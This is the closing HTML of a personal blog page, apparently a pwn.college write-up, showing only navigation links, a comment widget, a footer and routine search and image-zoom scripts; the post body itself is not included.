</div></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2024/05/09/PwnCollege2-ProgramInteraction/" rel="prev" title="pwnCollege2-ProgramInteraction"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">pwnCollege2-ProgramInteraction</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2024/05/04/web-practices/" rel="next" title="web-practices"><span class="post-nav-text">web-practices</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>ÊÇ®ÈúÄË¶ÅÁßëÂ≠¶‰∏äÁΩëÔºåÊâçÂèØ‰ΩøÁî®ËØÑËÆ∫Âå∫ÂäüËÉΩ„ÄÇ</span><br></div><div id="waline"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><script>window.CONFIG.waline.config.path = "/2024/05/09/PwnCollege1-ProgramMiuse/"</script><div class="js-Pjax"><script src="/js/comments/waline.js" type="module" defer></script></div></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank"></a></div><div class="copyright"><span>&copy; 2023 ‚Äì 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Npc</span></div><div class="footer-custom-text">=w=</div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="Search"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="Searching..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>